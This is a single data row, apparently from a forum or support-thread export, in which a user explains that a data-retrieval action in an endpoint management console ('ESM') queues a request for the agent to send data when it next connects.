717,132854,hayun,"Exactly. The data retrival create an action for the agent to send the dataon the next time it connects to the ESM. Once the datais recieved by the ESM it will appear in the ""DataRetrieval"" screen.",0,12-15-2016,11:15 PM
